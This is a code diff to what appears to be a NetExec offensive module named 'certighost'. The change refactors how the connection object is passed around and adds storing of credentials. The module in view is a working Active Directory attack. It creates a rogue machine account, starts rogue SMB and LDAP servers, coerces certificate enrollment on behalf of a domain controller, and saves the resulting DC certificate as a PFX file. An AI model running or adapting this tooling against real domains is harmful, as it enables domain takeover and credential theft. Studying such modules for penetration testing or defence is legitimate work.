@@ -707,6 +707,7 @@ class NXCModule:
     def __init__(self, context=None, module_options=None):
         self.context = context
         self.module_options = module_options
+        self.connection = None
         self.listener = None
         self.target = None
         self.ca = None
@@ -737,22 +738,23 @@ class NXCModule:
 
     def on_login(self, context, connection):
         self.context = context
+        self.connection = connection
 
         if not self.listener:
             self.context.log.fail("LISTENER (or L) is required")
             return
 
-        cas = self.enumerate_certificate_authorities(connection)
+        cas = self.enumerate_certificate_authorities()
         if not cas:
             self.context.log.fail("No pKIEnrollmentService found in AD")
             return
 
-        self.run_exploit(connection, cas)
+        self.run_exploit(cas)
 
-    def enumerate_certificate_authorities(self, connection):
-        search_base = f"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,{connection.baseDN}"
+    def enumerate_certificate_authorities(self):
+        search_base = f"CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,{self.connection.baseDN}"
         try:
-            resp = connection.search(
+            resp = self.connection.search(
                 searchFilter="(objectClass=pKIEnrollmentService)",
                 attributes=["cn", "dNSHostName"],
                 baseDN=search_base,
@@ -768,11 +770,11 @@ class NXCModule:
             dns_hostname = entry.get("dNSHostName", "")
             ca_ip = None
             if dns_hostname:
-                ca_ip = resolve_hostname(self.context, dns_hostname, connection.host)
-            cas.append({"cn": cn, "dNSHostName": dns_hostname, "ip": ca_ip or connection.host})
+                ca_ip = resolve_hostname(self.context, dns_hostname, self.connection.host)
+            cas.append({"cn": cn, "dNSHostName": dns_hostname, "ip": ca_ip or self.connection.host})
         return cas
 
-    def get_target_dc(self, connection):
+    def get_target_dc(self):
         if self.target:
             target_sam = self.target if self.target.endswith("$") else self.target + "$"
             search_filter = f"(&(objectCategory=computer)(sAMAccountName={target_sam}))"
@@ -782,7 +784,7 @@ class NXCModule:
             err_msg = "No Domain Controller found via LDAP"
 
         try:
-            resp = connection.search(
+            resp = self.connection.search(
                 searchFilter=search_filter,
                 attributes=["dNSHostName", "sAMAccountName", "objectSid"],
                 sizeLimit=1,
@@ -798,7 +800,7 @@ class NXCModule:
 
         dc = entries[0]
         dc_sam = dc.get("sAMAccountName", "")
-        dc_dns = dc.get("dNSHostName", f"{dc_sam.rstrip('$')}.{connection.domain}")
+        dc_dns = dc.get("dNSHostName", f"{dc_sam.rstrip('$')}.{self.connection.domain}")
         dc_sid_str = dc.get("objectSid", "")
         if isinstance(dc_sid_str, str) and dc_sid_str.startswith("S-"):
             sid_obj = SID()
@@ -807,12 +809,12 @@ class NXCModule:
         else:
             dc_sid_bin = dc_sid_str
 
-        domain_sid = connection.sid_domain or "-".join(dc_sid_str.split("-")[:-1])
+        domain_sid = self.connection.sid_domain or "-".join(dc_sid_str.split("-")[:-1])
 
         domain_guid = b"\x00" * 16
         try:
-            raw = connection.ldap_connection.search(
-                searchBase=connection.baseDN,
+            raw = self.connection.ldap_connection.search(
+                searchBase=self.connection.baseDN,
                 searchFilter="(objectClass=*)",
                 attributes=["objectGUID"],
                 scope=Scope("baseObject"),
@@ -832,7 +834,7 @@ class NXCModule:
             sid_bin=dc_sid_bin,
             domain_sid=domain_sid,
             domain_guid=domain_guid,
-            domain_nb=dns_to_netbios(connection.domain),
+            domain_nb=dns_to_netbios(self.connection.domain),
         )
 
     def check_bind_capabilities(self, label, error):
@@ -849,39 +851,39 @@ class NXCModule:
             return None
         return cas[0]
 
-    def get_or_create_computer(self, connection):
-        if connection.username.endswith("$"):
-            comp_name = connection.username
-            if connection.nthash:
-                comp_hash = connection.nthash
-            elif connection.password:
-                comp_hash = MD4.new(connection.password.encode("utf-16-le")).hexdigest()
+    def get_or_create_computer(self):
+        if self.connection.username.endswith("$"):
+            comp_name = self.connection.username
+            if self.connection.nthash:
+                comp_hash = self.connection.nthash
+            elif self.connection.password:
+                comp_hash = MD4.new(self.connection.password.encode("utf-16-le")).hexdigest()
             else:
                 self.context.log.fail("Machine account provided but no password or hash available")
                 return None
             try:
-                resp = connection.search(searchFilter=f"(&(objectCategory=computer)(sAMAccountName={comp_name}))", attributes=["sAMAccountName", "dNSHostName"], sizeLimit=1,)
+                resp = self.connection.search(searchFilter=f"(&(objectCategory=computer)(sAMAccountName={comp_name}))", attributes=["sAMAccountName", "dNSHostName"], sizeLimit=1,)
             except Exception as e:
                 self.context.log.fail(f"LDAP verification of '{comp_name}' failed: {e}")
                 return None
             if not parse_result_attributes(resp):
                 self.context.log.fail(f"Machine account '{comp_name}' not found in AD")
                 return None
-            comp_pass = connection.password or ""
+            comp_pass = self.connection.password or ""
             self.context.log.display(f"Using existing machine account: {comp_name}")
             return MachineAccount(name=comp_name, password=comp_pass, hash=comp_hash)
 
         comp_name = f"{gen_random_string(12).upper()}$"
         comp_pass = gen_random_string(16) + "Aa1"
         name_cn = comp_name.rstrip("$")
-        comp_dn = f"CN={name_cn},CN=Computers,{connection.baseDN}"
-        fqdn = f"{name_cn}.{connection.domain}"
+        comp_dn = f"CN={name_cn},CN=Computers,{self.connection.baseDN}"
+        fqdn = f"{name_cn}.{self.connection.domain}"
         spns = [f"HOST/{name_cn}", f"HOST/{fqdn}",
                 f"RestrictedKrbHost/{name_cn}", f"RestrictedKrbHost/{fqdn}"]
 
         self.context.log.display(f"Creating machine account: {comp_name}")
         try:
-            connection.ldap_connection.add(
+            self.connection.ldap_connection.add(
                 comp_dn,
                 ["top", "person", "organizationalPerson", "user", "computer"],
                 {
@@ -906,19 +908,20 @@ class NXCModule:
             return None
 
         self.context.log.success(f"Created {comp_name} with password {comp_pass}")
+        self.context.db.add_credential("plaintext", self.connection.domain, comp_name, comp_pass)
         comp_hash = MD4.new(comp_pass.encode("utf-16-le")).hexdigest()
         return MachineAccount(name=comp_name, password=comp_pass, hash=comp_hash)
 
-    def run_exploit(self, connection, cas):
+    def run_exploit(self, cas):
         ca = self.select_target_ca(cas)
         if not ca:
             return
 
-        dc_info = self.get_target_dc(connection)
+        dc_info = self.get_target_dc()
         if not dc_info:
             return
 
-        comp = self.get_or_create_computer(connection)
+        comp = self.get_or_create_computer()
         if not comp:
             return
 
@@ -927,7 +930,7 @@ class NXCModule:
         for name in ("impacket", "impacket.smbserver", "impacket.dcerpc"):
             logging.getLogger(name).setLevel(logging.CRITICAL)
 
-        servers = self.start_rogue_servers(connection, dc_info, comp)
+        servers = self.start_rogue_servers(dc_info, comp)
         if not servers:
             return
         smb_state, ldap_state = servers
@@ -936,7 +939,7 @@ class NXCModule:
             self.context.log.display(f"Requesting certificate (template={self.template}, cdc={self.listener})")
             try:
                 pfx_data = request_certificate(
-                    self.context, ca["ip"], ca["cn"], connection.domain, comp.name, comp.hash, connection.host,
+                    self.context, ca["ip"], ca["cn"], self.connection.domain, comp.name, comp.hash, self.connection.host,
                     self.listener, dc_info.dns, self.template,
                 )
             except RuntimeError as e:
@@ -946,21 +949,21 @@ class NXCModule:
                 self.context.log.fail(f"RPC error during enrollment: {e}")
                 return
 
-            self.save_certificate(connection, pfx_data, dc_info.cn)
+            self.save_certificate(pfx_data, dc_info.cn)
         finally:
             self.stop_rogue_servers(smb_state, ldap_state)
 
-    def start_rogue_servers(self, connection, dc_info, comp):
+    def start_rogue_servers(self, dc_info, comp):
         self.context.log.display("Starting rogue servers (SMB:445 + LDAP:389)")
         smb_state = RogueServerState()
         threading.Thread(
             target=run_rogue_smb, daemon=True,
-            args=(self.context, "0.0.0.0", 445, dc_info.domain_nb, connection.domain, connection.domain, dc_info.domain_guid,
-                  dc_info.domain_sid, comp.name, comp.hash, comp.password, connection.domain, connection.host,
+            args=(self.context, "0.0.0.0", 445, dc_info.domain_nb, self.connection.domain, self.connection.domain, dc_info.domain_guid,
+                  dc_info.domain_sid, comp.name, comp.hash, comp.password, self.connection.domain, self.connection.host,
                   smb_state),).start()
 
-        ldap_srv = RogueLDAP(self.context, connection.domain, dc_info.domain_nb, connection.baseDN, comp.name,
-                             comp.hash, connection.domain, connection.host, dc_info.sid_bin, dc_info.dns,
+        ldap_srv = RogueLDAP(self.context, self.connection.domain, dc_info.domain_nb, self.connection.baseDN, comp.name,
+                             comp.hash, self.connection.domain, self.connection.host, dc_info.sid_bin, dc_info.dns,
                              dc_info.cn, dc_info.sam)
         ldap_state = RogueServerState()
         threading.Thread(target=ldap_srv.serve, daemon=True, args=("0.0.0.0", 389, ldap_state)).start()
@@ -996,8 +999,8 @@ class NXCModule:
             self.safe_call(lambda: ldap_state.server.shutdown(socket.SHUT_RDWR), "Error shutting down rogue LDAP server")
             self.safe_call(ldap_state.server.close, "Error closing rogue LDAP server")
 
-    def save_certificate(self, connection, pfx_data, target_cn):
-        output_dir = os.path.join(NXC_PATH, "modules", "certighost", connection.domain)
+    def save_certificate(self, pfx_data, target_cn):
+        output_dir = os.path.join(NXC_PATH, "modules", "certighost", self.connection.domain)
         os.makedirs(output_dir, exist_ok=True)
         pfx_path = os.path.join(output_dir, f"{target_cn.lower()}.pfx")
         Path(pfx_path).write_bytes(pfx_data)
